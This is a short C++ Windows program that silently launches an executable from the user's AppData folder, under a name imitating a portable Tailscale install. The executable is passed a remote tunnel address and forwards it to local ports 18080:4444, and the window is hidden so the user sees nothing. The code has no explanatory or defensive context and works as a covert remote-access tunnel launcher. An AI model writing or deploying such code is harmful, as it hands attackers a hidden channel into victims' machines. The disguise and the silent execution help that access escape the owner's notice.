#include <windows.h>
#include <string>
void start_tunnel(const char *tc_addr) {
    char roaming[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\TailscalePortable\\tailcat.exe", roaming, MAX_PATH);
    std::string cmd = std::string("\"") + roaming + "\" forward " + tc_addr + " 18080:4444";
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}


int main(){start_tunnel("tc222222222222222222222222222222222222222222222222222222222222");}
